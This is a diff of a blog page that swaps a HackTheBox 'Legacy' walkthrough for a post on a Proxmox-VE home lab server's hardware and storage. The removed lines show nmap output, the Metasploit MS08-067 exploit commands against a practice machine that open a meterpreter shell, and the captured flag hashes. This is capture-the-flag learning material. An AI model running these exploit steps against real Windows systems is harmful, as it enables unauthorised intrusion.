@@ -10,8 +10,8 @@
   <head>
     <meta charset="utf-8">
 
-<!-- begin _includes/seo.html --><title>HackTheBox Legacy - Dcodezero</title>
-<meta name="description" content="Legacy is a retired Windows machine that is rated as Easy on Hack the Box.">
+<!-- begin _includes/seo.html --><title>HomeLab Part-01 - Dcodezero</title>
+<meta name="description" content="This the where you’ll see the hardware infrastructure of my home lab">
 
 
   <meta name="author" content="DcodeZer0">
@@ -23,32 +23,32 @@
 <meta property="og:type" content="article">
 <meta property="og:locale" content="en_US">
 <meta property="og:site_name" content="Dcodezero">
-<meta property="og:title" content="HackTheBox Legacy">
-<meta property="og:url" content="http://localhost:4000/hackthebox/Legacy/">
+<meta property="og:title" content="HomeLab Part-01">
+<meta property="og:url" content="http://localhost:4000/it/Homelad/">
 
 
-  <meta property="og:description" content="Legacy is a retired Windows machine that is rated as Easy on Hack the Box.">
-
-
-
-  <meta property="og:image" content="http://localhost:4000/assets/img/sample/legacy.png">
+  <meta property="og:description" content="This the where you’ll see the hardware infrastructure of my home lab">
 
 
 
-
-
-  <meta property="article:published_time" content="2020-03-09T00:00:00+05:30">
+  <meta property="og:image" content="http://localhost:4000/assets/images/sample/homelab/Homelab.jpg">
 
 
 
 
 
-  
+  <meta property="article:published_time" content="2024-11-15T00:00:00+05:30">
+
+
+
+
 
   
 
+  
 
-<link rel="canonical" href="http://localhost:4000/hackthebox/Legacy/">
+
+<link rel="canonical" href="http://localhost:4000/it/Homelad/">
 
 
 
@@ -169,18 +169,18 @@
 
 
 <div class="page__hero--overlay"
-  style="background-color: #000; background-image: linear-gradient(rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0.75)), url('/assets/img/sample/legacy.png');"
+  style="background-color: #000; background-image: linear-gradient(rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0.75)), url('/assets/images/sample/homelab/Homelab.jpg');"
 >
   
     <div class="wrapper">
       <h1 id="page-title" class="page__title" itemprop="headline">
         
-          HackTheBox Legacy
+          HomeLab Part-01
 
         
       </h1>
       
-        <p class="page__lead">Legacy is a retired Windows machine that is rated as Easy on Hack the Box.
+        <p class="page__lead">This the where you’ll see the hardware infrastructure of my home lab
 </p>
       
       
@@ -191,7 +191,7 @@
       <span class="page__meta-date">
         <i class="far fa-calendar-alt" aria-hidden="true"></i>
         
-        <time datetime="2020-03-09T00:00:00+05:30">March 9, 2020</time>
+        <time datetime="2024-11-15T00:00:00+05:30">November 15, 2024</time>
       </span>
     
 
@@ -204,19 +204,13 @@
       <span class="page__meta-readtime">
         <i class="far fa-clock" aria-hidden="true"></i>
         
-          2 minute read
+          4 minute read
         
       </span>
     
   </p>
 
 
-      
-        <p>
-        
-          <a href="/hackthebox/Legacy/" class="btn btn--light-outline btn--large">Part 2</a>
-        
-        </p>
       
     </div>
   
@@ -249,7 +243,7 @@
       
         
         <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
-          <a href="/categories/#hackthebox" itemprop="item"><span itemprop="name">Hackthebox</span></a>
+          <a href="/categories/#it" itemprop="item"><span itemprop="name">It</span></a>
           <meta itemprop="position" content="2" />
         </li>
         <span class="sep">/</span>
@@ -257,7 +251,7 @@
     
       
       
-        <li class="current">HackTheBox Legacy</li>
+        <li class="current">HomeLab Part-01</li>
       
     
   </ol>
@@ -392,9 +386,9 @@
 
 
   <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
-    <meta itemprop="headline" content="HackTheBox Legacy">
-    <meta itemprop="description" content="Legacy is a retired Windows machine that is rated as Easy on Hack the Box.">
-    <meta itemprop="datePublished" content="2020-03-09T00:00:00+05:30">
+    <meta itemprop="headline" content="HomeLab Part-01">
+    <meta itemprop="description" content="This the where you’ll see the hardware infrastructure of my home lab">
+    <meta itemprop="datePublished" content="2024-11-15T00:00:00+05:30">
     
 
     <div class="page__inner-wrap">
@@ -405,108 +399,74 @@
           <aside class="sidebar__right ">
             <nav class="toc">
               <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
-              <ul class="toc__menu"><li><a href="#lets-get-started">Let’s get started</a><ul><li><a href="#as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</a></li></ul></li><li><a href="#metasploit">metasploit</a></li><li><a href="#getting-usertxt">Getting User.txt</a></li><li><a href="#getting-roottxt">Getting Root.txt</a><ul><li><a href="#gaining-both-the-flags-is-just-so-easy">Gaining both the flags is just so easy.</a></li></ul></li></ul></li></ul>
+              <ul class="toc__menu"><li><a href="#why-i-chose-proxmox-ve-over-other-hypervisors">Why I chose Proxmox-VE over other Hypervisors</a><ul><li><a href="#the-hardware-side-of-things">The Hardware side of things</a></li><li><a href="#server-configuration">Server configuration</a></li><li><a href="#why-choose-proxmox-ve-over-others">Why choose Proxmox-VE over others?</a></li><li><a href="#the-storage">The Storage</a></li><li><a href="#well-thats-okay-so-what-about-the-backup-and-storage-part-of-the-story">Well thats okay! So what about the backup and storage part of the story?</a></li><li><a href="#how-many-virtual-machines-can-be-run-with-the-above-configuration">How many Virtual machines can be run with the above configuration?</a><ul><li><a href="#in-the-next-blog-ill-be-showing-how-to-setup-the-network-configurations-on-proxmox-ve-so-stay-tuned-for-it">In the next blog, I’ll be showing how to setup the network configurations on Proxmox-VE. So stay tuned for it.</a></li></ul></li></ul></li></ul></li></ul>
             </nav>
           </aside>
         
-        <h2 id="lets-get-started">Let’s get started</h2>
+        <h1 id="why-i-chose-proxmox-ve-over-other-hypervisors">Why I chose <code class="language-plaintext highlighter-rouge">Proxmox-VE</code> over other <code class="language-plaintext highlighter-rouge">Hypervisors</code></h1>
 
-<h3 id="as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</h3>
+<h3 id="the-hardware-side-of-things">The Hardware side of things</h3>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report for 10.10.10.4
-PORT     STATE  SERVICE       VERSION
-139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
-445/tcp  open   microsoft-ds  Windows XP microsoft-ds
-3389/tcp closed ms-wbt-server
-Running (JUST GUESSING): Microsoft Windows 2000|XP|2003|PocketPC/CE (91%)
-OS CPE: cpe:/o:microsoft:windows_2000 cpe:/o:microsoft:windows_xp 
-Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+<p>It’s been quite some time I’ve been using a Enterprise level server for my home lab. I got the barebones hardware for about 350 dollars, which has only 32 gigs of ram initially. Later I’ve upgraded the RAM to 128 GB for an other  220 dollars, which sums up to 570 USD.</p>
 
-Host script results:
-|_nbstat: NetBIOS name: LEGACY, NetBIOS user: unknown, NetBIOS MAC: 00:50:56:aa:ea:dc (VMware)
-| smb-os-discovery: 
-|   OS: Windows XP (Windows 2000 LAN Manager)
-|   OS CPE: cpe:/o:microsoft:windows_xp::-
-|   Computer name: legacy
-|   NetBIOS computer name: LEGACY\x00
-|   Workgroup: HTB\x00
-| smb-security-mode: 
-|   account_used: blank
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
-</code></pre></div></div>
+<p>This server has dual <code class="language-plaintext highlighter-rouge">Intel(R) Xeon(R) CPU X5650</code> which clocks <code class="language-plaintext highlighter-rouge">@ 2.67GHz</code>. These are pretty powerful and can easily satisfy my requirements to run my HomeLab infrastructure.</p>
 
-<p>As we can see that it’s a windows [XP] machine, It can be exploited in many ways.
-The easy way is to use metasploit and take down the machine.</p>
+<h3 id="server-configuration">Server configuration</h3>
 
-<h2 id="metasploit">metasploit</h2>
+<p><img src="/assets/images/sample/homelab/1.png" alt="" /></p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole
-msf5 &gt; search netapi
-Matching Modules
-================
+<p>Coming to the hypervisor, I tried between multiple like <code class="language-plaintext highlighter-rouge">VMware EXSI</code>, <code class="language-plaintext highlighter-rouge">Microsoft Hyper-V</code>, <code class="language-plaintext highlighter-rouge">Linux Server</code>, <code class="language-plaintext highlighter-rouge">Vmware</code>, <code class="language-plaintext highlighter-rouge">Virtaul Box</code> and finally settled with <code class="language-plaintext highlighter-rouge">Proxmox-VE</code>. However Setting up <code class="language-plaintext highlighter-rouge">Proxmox-VE</code> is straight forwarded stuff. So I’m not going to show how to install steps or setup process. There are a ton of videos and blogs that show the same thing.</p>
 
-   #  Name                                 Disclosure Date  Rank    Check  Description
-   -  ----                                 ---------------  ----    -----  -----------
-   0  exploit/windows/smb/ms03_049_netapi  2003-11-11       good    No     MS03-049 Microsoft Workstation Service NetAddAlternateComputerName Overflow
-   1  exploit/windows/smb/ms06_040_netapi  2006-08-08       good    No     MS06-040 Microsoft Server Service NetpwPathCanonicalize Overflow
-   2  exploit/windows/smb/ms06_070_wkssvc  2006-11-14       manual  No     MS06-070 Microsoft Workstation Service NetpManageIPCConnect Overflow
-   3  exploit/windows/smb/ms08_067_netapi  2008-10-28       great   Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
-</code></pre></div></div>
+<h3 id="why-choose-proxmox-ve-over-others">Why choose <code class="language-plaintext highlighter-rouge">Proxmox-VE</code> over others?</h3>
 
-<p><br />
-<br /></p>
+<p>These are some advantages that I personally feel that are best for my use case. Remember your use case can be different.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    msf5 &gt; use exploit/windows/smb/ms08_067_netapi
-    msf5 exploit(windows/smb/ms08_067_netapi) &gt; set rhost 10.10.10.4
-    rhost =&gt; 10.10.10.4
-    msf5 exploit(windows/smb/ms08_067_netapi) &gt; set lhost tun0
-    lhost =&gt; tun0
-    msf5 exploit(windows/smb/ms08_067_netapi) &gt; exploit
-</code></pre></div></div>
+<ol>
+  <li><strong>Free and Open Source</strong>: Proxmox VE is free with no licensing fees, and has strong community support.</li>
+  <li><strong>All-in-One Solution</strong>: Supports both <strong>virtual machines (KVM)</strong> and <strong>containers (LXC)</strong>, giving you flexibility for different workloads.</li>
+  <li><strong>User-Friendly Web Interface</strong>: Easy-to-use web-based management console for managing VMs, containers, storage, and networking.</li>
+  <li><strong>Powerful Storage Options</strong>: Supports local storage, NFS, iSCSI, Ceph, and ZFS for flexible and robust storage configurations.</li>
+  <li><strong>High Availability (HA) and Clustering</strong>: Easily create clusters of multiple nodes for scalability and automatic failover in case of hardware failure.</li>
+  <li><strong>Built-in Backup and Restore</strong>: Simple backup and restore tools, with support for live backups of VMs and containers.</li>
+  <li><strong>Advanced Networking Features</strong>: Includes support for VLANs, bridges, and virtual switches for complex networking setups.</li>
+  <li><strong>Security</strong>: Features like role-based access control (RBAC), firewalls, and VPN support to secure your virtual environment.</li>
+  <li><strong>Scalable and Flexible</strong>: Add more nodes to your cluster as needed, with efficient resource management.</li>
+  <li><strong>Cross-Platform Support</strong>: Run both Linux and Windows VMs with full hardware virtualization (KVM).</li>
+  <li><strong>Cost-Effective</strong>: Proxmox VE is low-cost compared to other enterprise solutions like VMware and Hyper-V, with no hidden fees.</li>
+</ol>
 
-<p>After the exploit is successfully completed we get the meterpreter shell…</p>
+<h3 id="the-storage">The Storage</h3>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    meterpreter &gt; sysinfo
-    Computer        : LEGACY
-    OS              : Windows XP (5.1 Build 2600, Service Pack 3).
-    Architecture    : x86
-    System Language : en_US
-    Domain          : HTB
-    Logged On Users : 1
-    Meterpreter     : x86/windows
-</code></pre></div></div>
+<p>I chose to have multiple disks for my <code class="language-plaintext highlighter-rouge">Proxmox-VE</code>.</p>
 
-<h2 id="getting-usertxt">Getting User.txt</h2>
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">1-TB-SSD</code> This is where all the faster and quicker VM are going to be. 
+<code class="language-plaintext highlighter-rouge">2x-500GB-SATA</code> in which
+	<code class="language-plaintext highlighter-rouge">1x-500GB-Sata</code> is going to be used for Slower Virtual machines
+	<code class="language-plaintext highlighter-rouge">1x-500GB-Sata</code> is used to store all the required ISO files.</p>
+</blockquote>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    meterpreter &gt; ls
-    Listing: C:\Documents and Settings\john\Desktop
-    ===============================================
-    Mode              Size  Type  Last modified              Name
-    ----              ----  ----  -------------              ----
-    100444/r--r--r--  32    fil   2017-03-16 02:19:32 -0400  user.txt
-    meterpreter &gt; cat user.txt
-    e69af0e4f443de7e36876fda4ec7644f
-</code></pre></div></div>
+<h3 id="well-thats-okay-so-what-about-the-backup-and-storage-part-of-the-story">Well thats okay! So what about the backup and storage part of the story?</h3>
 
-<h2 id="getting-roottxt">Getting Root.txt</h2>
+<p>Well to answer this, I’ve a built a dedicated <code class="language-plaintext highlighter-rouge">NAS-Storage</code> which has <code class="language-plaintext highlighter-rouge">2x-2-TB</code> Drives in it and runs on <code class="language-plaintext highlighter-rouge">OpenMediaVault</code>. This build completely serves my purpose from storing my personal and Virtual machines.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    meterpreter &gt; ls
-    Listing: C:\Documents and Settings\Administrator\Desktop
-    ========================================================
-    Mode              Size  Type  Last modified              Name
-    ----              ----  ----  -------------              ----
-    100444/r--r--r--  32    fil   2017-03-16 02:18:19 -0400  root.txt
-    meterpreter &gt; cat root.txt
-    993442d258b0e0ec917cae9e695d5713
-</code></pre></div></div>
+<p>I’ve automated the backup process from my <code class="language-plaintext highlighter-rouge">Proxmox</code> to <code class="language-plaintext highlighter-rouge">NAS-Storage</code> with the help of <code class="language-plaintext highlighter-rouge">Raspberry-Pi-3B</code> (runs 24/7).</p>
 
-<h4 id="gaining-both-the-flags-is-just-so-easy">Gaining both the flags is just so easy.</h4>
+<h3 id="how-many-virtual-machines-can-be-run-with-the-above-configuration">How many Virtual machines can be run with the above configuration?</h3>
 
-<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.</p>
+<p>Well the answer is how much of <code class="language-plaintext highlighter-rouge">RAM</code> and <code class="language-plaintext highlighter-rouge">Procressors</code> are allocated to each machine or VM. So assume you are allocating 4-Gigs of ram for each VM you are using. you can divide it with the total amount of ram you have.</p>
 
-<p>My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>
+<p>In my case I’ve 128-Gigs. So, if I allocate 4-gigs of ram to each <code class="language-plaintext highlighter-rouge">VM</code>, then I can run 20-25 <code class="language-plaintext highlighter-rouge">VMs</code> with out any compromise or stressing the hardware.</p>
+
+<p>Below is a snip of the number of VM’s that run on the <code class="language-plaintext highlighter-rouge">Proxmox-VE</code> host.</p>
+
+<p><img src="/assets/images/sample/homelab/2.png" alt="" /></p>
+
+<p>This is the summary of my <code class="language-plaintext highlighter-rouge">Proxmox-VE</code>, which shows the consumption of both <code class="language-plaintext highlighter-rouge">CPUs</code> and <code class="language-plaintext highlighter-rouge">RAM</code> utilisation.</p>
+
+<p><img src="/assets/images/sample/homelab/3.png" alt="" /></p>
+
+<h4 id="in-the-next-blog-ill-be-showing-how-to-setup-the-network-configurations-on-proxmox-ve-so-stay-tuned-for-it">In the next blog, I’ll be showing how to setup the network configurations on <code class="language-plaintext highlighter-rouge">Proxmox-VE</code>. So stay tuned for it.</h4>
 
         
       </section>
@@ -523,9 +483,13 @@ Matching Modules
     <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
     <span itemprop="keywords">
     
-      <a href="/tags/#metasploit" class="page__taxonomy-item p-category" rel="tag">metasploit</a><span class="sep">, </span>
+      <a href="/tags/#boot2root" class="page__taxonomy-item p-category" rel="tag">boot2root</a><span class="sep">, </span>
     
-      <a href="/tags/#windows" class="page__taxonomy-item p-category" rel="tag">Windows,</a>
+      <a href="/tags/#gobuster" class="page__taxonomy-item p-category" rel="tag">gobuster,</a><span class="sep">, </span>
+    
+      <a href="/tags/#linux" class="page__taxonomy-item p-category" rel="tag">linux,</a><span class="sep">, </span>
+    
+      <a href="/tags/#wordpress" class="page__taxonomy-item p-category" rel="tag">wordpress,</a>
     
     </span>
   </p>
@@ -542,7 +506,7 @@ Matching Modules
     <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
     <span itemprop="keywords">
     
-      <a href="/categories/#hackthebox" class="page__taxonomy-item p-category" rel="tag">hackthebox</a>
+      <a href="/categories/#it" class="page__taxonomy-item p-category" rel="tag">IT</a>
     
     </span>
   </p>
@@ -550,28 +514,28 @@ Matching Modules
 
         
 
-  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2020-03-09T00:00:00+05:30">March 9, 2020</time></p>
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2024-11-15T00:00:00+05:30">November 15, 2024</time></p>
 
       </footer>
 
       <section class="page__share">
   <h4 class="page__share-title">Share on</h4>
 
-  <a href="https://twitter.com/intent/tweet?text=HackTheBox+Legacy%20http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2FLegacy%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+  <a href="https://twitter.com/intent/tweet?text=HomeLab+Part-01%20http%3A%2F%2Flocalhost%3A4000%2Fit%2FHomelad%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
 
-  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2FLegacy%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fit%2FHomelad%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
 
-  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4000/hackthebox/Legacy/" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4000/it/Homelad/" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
 </section>
 
 
       
   <nav class="pagination">
     
-      <a href="/vulnhub/Evm/" class="pagination--pager" title="Vulnhub EVM">Previous</a>
+      <a href="/tools/spoofcheck/" class="pagination--pager" title="SpoofCheck.py">Previous</a>
     
     
-      <a href="/hackthebox/Bashed/" class="pagination--pager" title="HackTheBox Bashed">Next</a>
+      <a href="/goad/GOAD-p1/" class="pagination--pager" title="Game of Active Directory - Part 1">Next</a>
     
   </nav>
 
@@ -700,58 +664,6 @@ Matching Modules
   <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
     
       <div class="archive__item-teaser">
-        <img src="/assets/images/sample/homelab/Homelab.jpg" alt="">
-      </div>
-    
-    <h2 class="archive__item-title no_toc" itemprop="headline">
-      
-        <a href="/it/Homelad/" rel="permalink">HomeLab Part-01
-</a>
-      
-    </h2>
-    
-
-  <p class="page__meta">
-    
-      
-      <span class="page__meta-date">
-        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
-        
-        <time datetime="2024-11-15T00:00:00+05:30">November 15, 2024</time>
-      </span>
-    
-
-    <span class="page__meta-sep"></span>
-
-    
-      
-      
-
-      <span class="page__meta-readtime">
-        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
-        
-          4 minute read
-        
-      </span>
-    
-  </p>
-
-
-    <p class="archive__item-excerpt" itemprop="description">This the where you’ll see the hardware infrastructure of my home lab
-</p>
-  </article>
-</div>
-
-    
-      
-      
-
-
-
-<div class="grid__item">
-  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
-    
-      <div class="archive__item-teaser">
         <img src="/assets/images/sample/spoof-check/spoofing.jpg" alt="">
       </div>
     
@@ -782,7 +694,7 @@ Matching Modules
       <span class="page__meta-readtime">
         <i class="far fa-fw fa-clock" aria-hidden="true"></i>
         
-          4 minute read
+          3 minute read
         
       </span>
     
@@ -790,6 +702,58 @@ Matching Modules
 
 
     <p class="archive__item-excerpt" itemprop="description">This tool checks if domain spoofing is possible or not.
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/html-obfs/html-obfs.jpg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/tools/HTML-Obfuscator/" rel="permalink">HTML-Obfuscator
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-10-02T00:00:00+05:30">October 2, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Simple Python program to Obfuscate and Dobfuscate HTML files. The program also allows you to obfuscate and Dobfuscate multiple files in one go.
 </p>
   </article>
 </div>
@@ -872,8 +836,8 @@ Matching Modules
     
   <script>
     var disqus_config = function () {
-      this.page.url = "http://localhost:4000/hackthebox/Legacy/";  /* Replace PAGE_URL with your page's canonical URL variable */
-      this.page.identifier = "/hackthebox/Legacy"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
+      this.page.url = "http://localhost:4000/it/Homelad/";  /* Replace PAGE_URL with your page's canonical URL variable */
+      this.page.identifier = "/it/Homelad"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
     };
     (function() { /* DON'T EDIT BELOW THIS LINE */
       var d = document, s = d.createElement('script');
